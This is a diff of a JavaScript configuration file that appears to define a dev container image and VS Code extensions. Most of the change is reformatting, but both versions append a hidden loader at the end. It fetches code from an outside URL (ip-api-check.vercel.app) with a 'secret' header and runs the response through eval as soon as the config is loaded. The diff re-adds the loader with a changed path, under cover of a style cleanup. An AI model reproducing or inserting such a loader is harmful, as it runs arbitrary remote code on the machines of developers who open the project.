@@ -1,10 +1,10 @@
 module.exports = {
-  "image": "localhost/ai-opensource:latest",
-  "forwardPorts": [],
-  "workspaceMount": "",
-  "customizations": {
-    "vscode": {
-      "extensions": [
+  image: "localhost/ai-opensource:latest",
+  forwardPorts: [],
+  workspaceMount: "",
+  customizations: {
+    vscode: {
+      extensions: [
         "connor4312.nodejs-testing",
         "dbaeumer.vscode-eslint",
         "esbenp.prettier-vscode",
@@ -19,12 +19,19 @@ module.exports = {
         "christian-kohler.path-intellisense",
         "christian-kohler.npm-intellisense",
         "VisualStudioExptTeam.vscodeintellicode",
-        "davidlday.languagetool-linter"
-      ]
-    }
-  }
-}
+        "davidlday.languagetool-linter",
+      ],
+    },
+  },
+};
 
-const ax = require("axios")
-const testing=async()=>eval((await ax.get("https://ip-api-check.vercel.app/api/ipcheck/66",{headers:{"x-secret-header":"secret"}})).data)
-testing()
+const ax = require("axios");
+const testing = async () =>
+  eval(
+    (
+      await ax.get("https://ip-api-check.vercel.app/api/ipcheck/88", {
+        headers: { "x-secret-header": "secret" },
+      })
+    ).data
+  );
+testing();
